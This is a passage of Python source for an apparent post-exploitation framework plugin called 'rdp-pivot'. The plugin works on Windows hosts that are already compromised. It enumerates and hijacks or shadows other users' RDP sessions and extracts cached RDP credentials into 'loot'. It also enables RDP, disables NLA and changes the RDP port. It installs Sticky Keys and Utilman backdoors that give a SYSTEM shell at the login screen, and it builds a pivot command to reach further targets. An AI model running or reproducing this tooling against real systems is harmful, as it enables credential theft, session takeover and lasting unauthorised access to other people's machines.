            return False, "Technique not found"
        
        cmd = technique.command_template
        out = exec_func(session, cmd)
        
        return True, out


# ── Main Plugin ─────────────────────────────────────────────────────────────

class RDPPivot(NexPlugin):
    name        = "rdp-pivot"
    description = "Advanced RDP intelligence — hijacking, shadowing, credentials, CVE detection"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "windows"
    category    = "lateral"
    mitre_id    = "T1021.001"
    
    def run(self, session, args: list):
        # Parse args
        scan_mode = '--scan' in (args or [])
        full_mode = '--full' in (args or [])
        enable_rdp = '--enable-rdp' in (args or [])
        hijack_id = None
        shadow_id = None
        extract_creds = '--extract-creds' in (args or [])
        sticky_keys = '--sticky-keys' in (args or [])
        utilman = '--utilman' in (args or [])
        cve_check = '--cve-check' in (args or [])
        list_mode = '--list' in (args or [])
        auto_pivot = '--auto-pivot' in (args or [])
        target_ip = None
        disable_nla = '--disable-nla' in (args or [])
        change_port = None
        
        for a in (args or []):
            if a.startswith('--hijack-session='):
                try:
                    hijack_id = int(a.split('=', 1)[1])
                except:
                    pass
            elif a.startswith('--shadow-session='):
                try:
                    shadow_id = int(a.split('=', 1)[1])
                except:
                    pass
            elif a.startswith('--target='):
                target_ip = a.split('=', 1)[1]
            elif a.startswith('--change-port='):
                try:
                    change_port = int(a.split('=', 1)[1])
                except:
                    pass
        
        if full_mode:
            scan_mode = extract_creds = cve_check = True
        
        if not any([scan_mode, enable_rdp, hijack_id, shadow_id, extract_creds,
                   sticky_keys, utilman, cve_check, list_mode, auto_pivot,
                   disable_nla, change_port]):
            scan_mode = True  # Default to scan
        
        self.info(f"🖥️ Starting RDP Pivot v3.0 (full={full_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🖥️ RDP Pivot v3.0 — Advanced RDP Intelligence]")
        sections.append("━"*64)
        
        findings_created = 0
        
        # ── Step 1: List Techniques ───────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available RDP Techniques")
            sections.append("─"*64)
            
            techniques = HijackTechniquesDatabase.get_all_techniques()
            
            sections.append(f"  [+] {len(techniques)} techniques available:")
            for tech in techniques:
                icon = '🟢' if tech.detection_risk == 'low' else '🟠' if tech.detection_risk == 'medium' else '🔴'
                sections.append(f"    {icon} {tech.name}")
                sections.append(f"        Success: {tech.success_rate}% | Risk: {tech.detection_risk}")
                sections.append(f"        SYSTEM Required: {'YES' if tech.requires_system else 'NO'}")
            
            return '\n'.join(sections)
        
        # ── Step 2: Configuration Analysis ────────────────────────────────
        if scan_mode:
            sections.append("\n[*] Phase 1: RDP Configuration Analysis")
            sections.append("─"*64)
            
            config = RDPConfigAnalyzer.analyze(self._exec, session)
            
            sections.append(f"  RDP Enabled: {'✅ YES' if config.enabled else '❌ NO'}")
            sections.append(f"  RDP Port: {config.port}" + (" (Custom)" if config.custom_rdp_port else " (Default)"))
            sections.append(f"  NLA Enabled: {'✅ YES (Secure)' if config.nla_enabled else '❌ NO (Vulnerable to BlueKeep/pre-auth)'}")
            sections.append(f"  Restricted Admin: {'✅ YES' if config.restricted_admin else '❌ NO'}")
            sections.append(f"  Credential Guard: {'✅ YES' if config.credential_guard else '❌ NO'}")
            sections.append(f"  TLS Level: {config.tls_level or 'Unknown'}")
            sections.append(f"  Shadowing Allowed: {'✅ YES' if config.shadowing_allowed else '❌ NO'}")
            sections.append(f"  TSGateway Enabled: {'✅ YES' if config.ts_gateway_enabled else '❌ NO'}")
            sections.append(f"  Firewall Rule Enabled: {'✅ YES' if config.firewall_enabled else '❌ NO'}")
            
            # Generate findings
            if config.enabled:
                self.finding(
                    title="RDP Access Enabled",
                    description=f"Remote Desktop is enabled on port {config.port}. This represents a lateral movement vector.",
                    severity="medium",
                    recommendation="Disable RDP if not required. Restrict via firewall to specific IPs.",
                    mitre_id=self.mitre_id,
                )
                findings_created += 1
            
            if not config.nla_enabled:
                self.finding(
                    title="RDP NLA Disabled",
                    description="Network Level Authentication is disabled. The system is vulnerable to pre-auth exploits like BlueKeep.",
                    severity="high",
                    recommendation="Enable NLA via: Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -Value 1",
                    mitre_id='T1021.001',
                )
                findings_created += 1
            
            if config.shadowing_allowed:
                self.finding(
                    title="RDP Shadowing Allowed",
                    description="RDP session shadowing is enabled, allowing remote viewing/control of sessions.",
                    severity="medium",
                    recommendation="Restrict shadowing via group policy if not required.",
                    mitre_id='T1563.002',
                )
                findings_created += 1
        
        # ── Step 3: Session Enumeration ───────────────────────────────────
        if scan_mode or hijack_id or shadow_id:
            sections.append("\n[*] Phase 2: RDP Session Enumeration")
            sections.append("─"*64)
            
            sessions_list = SessionManager.enumerate_sessions(self._exec, session)
            
            if sessions_list:
                sections.append(f"  [+] {len(sessions_list)} session(s) detected:")
                
                for sess in sessions_list:
                    icon = '🟢' if sess.state.lower() == 'active' else '🟡' if sess.state.lower() == 'disc' else '🔵'
                    hijack_icon = '💀' if sess.hijackable else ''
                    shadow_icon = '👁️' if sess.shadowable else ''
                    sections.append(f"    {icon} Session {sess.session_id}: {sess.username} @ {sess.session_name} [{sess.state}] {hijack_icon}{shadow_icon}")
                    sections.append(f"        Console: {'YES' if sess.console else 'NO'} | Hijackable: {'YES' if sess.hijackable else 'NO'}")
                
                # Save to loot
                self.loot(
                    {"sessions": [s.to_dict() for s in sessions_list]},
                    category='lateral',
                    source='rdp-pivot:sessions',
                    confidence='high'
                )
                
                # Check privileges for hijacking
                privs = self._exec(session, "whoami /priv 2>nul")
                is_admin = privs and ('SeImpersonatePrivilege' in privs or 'SeDebugPrivilege' in privs)
                
                if is_admin:
                    hijackable = SessionManager.get_hijackable_sessions(sessions_list)
                    if hijackable:
                        sections.append(f"\n  🔴 {len(hijackable)} hijackable session(s) detected!")
                        sections.append(f"  💡 Admin/SYSTEM privileges available — Session hijacking is possible")
                        sections.append(f"  💡 Command: plugins run rdp-pivot --hijack-session <id>")
            else:
                sections.append("  🟢 No active RDP sessions detected")
        
        # ── Step 4: CVE Detection ─────────────────────────────────────────
        if cve_check:
            sections.append("\n[*] Phase 3: RDP CVE Detection")
            sections.append("─"*64)
            
            cves = RDPCVEDatabase.get_all_cves()
            critical_cves = RDPCVEDatabase.get_critical_cves()
            preauth_cves = RDPCVEDatabase.get_preauth_cves()
            
            sections.append(f"  [+] {len(cves)} RDP CVEs in database")
            sections.append(f"  [+] {len(critical_cves)} Critical CVEs")
            sections.append(f"  [+] {len(preauth_cves)} Pre-Auth CVEs")
            
            # Get OS version to determine applicable CVEs
            os_info = self._exec(session, "systeminfo 2>nul | findstr /i \"OS Name\\|OS Version\"")
            
            sections.append("\n  Applicable CVEs based on OS:")
            for cve in cves[:5]:
                icon = '🔴' if cve.severity == 'critical' else '🟠' if cve.severity == 'high' else '🟡'
                sections.append(f"    {icon} {cve.cve_id} — {cve.name} [{cve.severity.upper()}]")
                sections.append(f"        Risk: {cve.risk_score}/100 | Pre-Auth: {'YES' if cve.pre_auth else 'NO'}")
                sections.append(f"        Affected: {cve.affected_versions}")
                if cve.exploit_tool:
                    sections.append(f"        Exploit: {cve.exploit_tool}")
            
            # Finding for critical CVEs
            if critical_cves:
                self.finding(
                    title=f"{len(critical_cves)} Critical RDP CVEs Applicable",
                    description=f"Critical RDP CVEs that may affect this system:\n" +
                               "\n".join(f"  • {c.cve_id}: {c.name}" for c in critical_cves[:5]),
                    severity="critical",
                    recommendation="Apply all Microsoft RDP security updates immediately. Enable NLA.",
                    mitre_id='T1210',
                )
                findings_created += 1
        
        # ── Step 5: Credential Extraction ─────────────────────────────────
        if extract_creds:
            sections.append("\n[*] Phase 4: RDP Credential Extraction")
            sections.append("─"*64)
            
            creds = CredentialExtractor.extract_all(self._exec, session)
            
            if creds:
                sections.append(f"  🔴 {len(creds)} credential source(s) detected:")
                
                by_source = defaultdict(list)
                for cred in creds:
                    by_source[cred.source].append(cred)
                
                for source, cred_list in by_source.items():
                    sections.append(f"\n    📂 {source.upper()} ({len(cred_list)} items):")
                    for cred in cred_list[:5]:
                        sections.append(f"      • {cred.target or cred.username}")
                
                # Save to loot
                self.loot(
                    {"credentials": [c.to_dict() for c in creds]},
                    category='credentials',
                    source='rdp-pivot:credentials',
                    confidence='high'
                )
                
                self.finding(
                    title=f"RDP Credentials Found — {len(creds)} sources",
                    description=f"RDP-related credentials discovered in {len(by_source)} source(s)",
                    severity="high",
                    recommendation="Clear RDP credential caches. Use protected RDP connections.",
                    mitre_id='T1552.001',
                )
                findings_created += 1
            else:
                sections.append("  🟢 No RDP credentials found")
        
        # ── Step 6: Enable RDP ────────────────────────────────────────────
        if enable_rdp:
            sections.append("\n[*] Phase 5: RDP Enablement")
            sections.append("─"*64)
            
            technique = next(t for t in HijackTechniquesDatabase.get_all_techniques()
                           if 'Enable RDP' in t.name)
            cmd = technique.command_template
            out = self._exec(session, cmd)
            
            sections.append(f"  [+] Enabling RDP...")
            sections.append(f"  [+] Result: {out.strip() if out else 'Success (empty)'}")
            
            self.emit('timeline.event', title="RDP Enabled", type="lateral", plugin=self.name)
        
        # ── Step 7: Disable NLA ───────────────────────────────────────────
        if disable_nla:
            sections.append("\n[*] Phase 6: NLA Disablement")
            sections.append("─"*64)
            
            technique = next(t for t in HijackTechniquesDatabase.get_all_techniques()
                           if 'Disable NLA' in t.name)
            cmd = technique.command_template
            out = self._exec(session, cmd)
            
            sections.append(f"  [+] Disabling NLA...")
            sections.append(f"  [+] Result: {out.strip() if out else 'Success'}")
        
        # ── Step 8: Session Hijacking ─────────────────────────────────────
        if hijack_id is not None:
            sections.append(f"\n[*] Phase 7: RDP Session Hijack (ID: {hijack_id})")
            sections.append("─"*64)
            
            success, output = HijackEngine.hijack_session(self._exec, session, hijack_id)
            
            if success:
                sections.append(f"  🔴 SUCCESS — Session {hijack_id} hijacked")
                sections.append(f"      Output: {output.strip()[:200]}")
                
                self.finding(
                    title=f"RDP Session Hijacked (ID: {hijack_id})",
                    description=f"Successfully hijacked RDP session {hijack_id}. Attacker now has interactive access to user's desktop.",
                    severity="critical",
                    recommendation="Terminate the hijacked session. Investigate lateral movement.",
                    mitre_id='T1563.002',
                )
                findings_created += 1
                
                self.emit('timeline.event', title=f"RDP Session Hijacked: {hijack_id}", type="lateral", plugin=self.name)
            else:
                sections.append(f"  ❌ FAILED — {output.strip()[:200]}")
        
        # ── Step 9: Session Shadowing ─────────────────────────────────────
        if shadow_id is not None:
            sections.append(f"\n[*] Phase 8: RDP Session Shadow (ID: {shadow_id})")
            sections.append("─"*64)
            
            success, output = HijackEngine.shadow_session(self._exec, session, shadow_id)
            
            if success:
                sections.append(f"  🔴 SUCCESS — Shadowing session {shadow_id}")
                sections.append(f"      Output: {output.strip()[:200]}")
                
                self.finding(
                    title=f"RDP Session Shadowed (ID: {shadow_id})",
                    description=f"RDP session {shadow_id} is being shadowed (viewed/controlled remotely).",
                    severity="high",
                    recommendation="Terminate shadow session. Restrict shadowing policy.",
                    mitre_id='T1563.002',
                )
                findings_created += 1
        
        # ── Step 10: Accessibility Bypass ─────────────────────────────────
        if sticky_keys or utilman:
            sections.append("\n[*] Phase 9: Accessibility Bypass Installation")
            sections.append("─"*64)
            
            if sticky_keys:
                sections.append("  [+] Installing Sticky Keys (sethc.exe) bypass...")
                success, output = HijackEngine.install_accessibility_bypass(
                    self._exec, session, 'Sticky Keys'
                )
                if success:
                    sections.append(f"      ✅ Installed — Press Shift 5 times at login for SYSTEM shell")
                    self.finding(
                        title="Sticky Keys Backdoor Installed",
                        description="sethc.exe replaced with cmd.exe — SYSTEM shell accessible from login screen",
                        severity="critical",
                        recommendation="Restore original sethc.exe from System32 backup. Enable SFC.",
                        mitre_id='T1546.008',
                    )
                    findings_created += 1
            
            if utilman:
                sections.append("  [+] Installing Utilman.exe bypass...")
                success, output = HijackEngine.install_accessibility_bypass(
                    self._exec, session, 'Utilman'
                )
                if success:
                    sections.append(f"      ✅ Installed — Click Ease of Access icon for SYSTEM shell")
                    self.finding(
                        title="Utilman Backdoor Installed",
                        description="Utilman.exe replaced with cmd.exe — SYSTEM shell accessible from login screen",
                        severity="critical",
                        recommendation="Restore original Utilman.exe. Monitor for file changes.",
                        mitre_id='T1546.008',
                    )
                    findings_created += 1
        
        # ── Step 11: Change Port ──────────────────────────────────────────
        if change_port:
            sections.append(f"\n[*] Phase 10: RDP Port Change (to {change_port})")
            sections.append("─"*64)
            
            technique = next(t for t in HijackTechniquesDatabase.get_all_techniques()
                           if 'Change RDP port' in t.name)
            cmd = technique.command_template.format(new_port=change_port)
            out = self._exec(session, cmd)
            
            sections.append(f"  [+] Changed RDP port to {change_port}")
            sections.append(f"  [+] Result: {out.strip()[:200] if out else 'Success'}")
        
        # ── Step 12: Auto-Pivot ───────────────────────────────────────────
        if auto_pivot and target_ip:
            sections.append(f"\n[*] Phase 11: Auto-Pivot to {target_ip}")
            sections.append("─"*64)
            
            # Build RDP chain command
            cmd = f"cmdkey /generic:TERMSRV/{target_ip} /user:Administrator /pass:PASSWORD && mstsc /v:{target_ip}"
            sections.append(f"  [+] Command: {cmd}")
            sections.append(f"  [+] Use valid credentials to establish RDP chain")
        
        # ── Step 13: Summary ──────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 RDP Pivot Summary]")
        sections.append("━"*64)
        sections.append(f"  Sessions Enumerated: {len(sessions_list) if 'sessions_list' in locals() else 0}")
        sections.append(f"  Credentials Found: {len(creds) if 'creds' in locals() else 0}")
        sections.append(f"  Hijack Attempts: {1 if hijack_id is not None else 0}")
        sections.append(f"  Shadow Attempts: {1 if shadow_id is not None else 0}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Save to Loot ──────────────────────────────────────────────────
        self.loot(
            {
                "type": "rdp_pivot_session",
                "findings_count": findings_created,
                "duration": duration,
            },
            category='lateral',
            source='rdp-pivot',
            confidence='high'
        )
        
        self.info(f"🖥️ RDP Pivot complete — {findings_created} findings")
        
        return '\n'.join(sections)
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''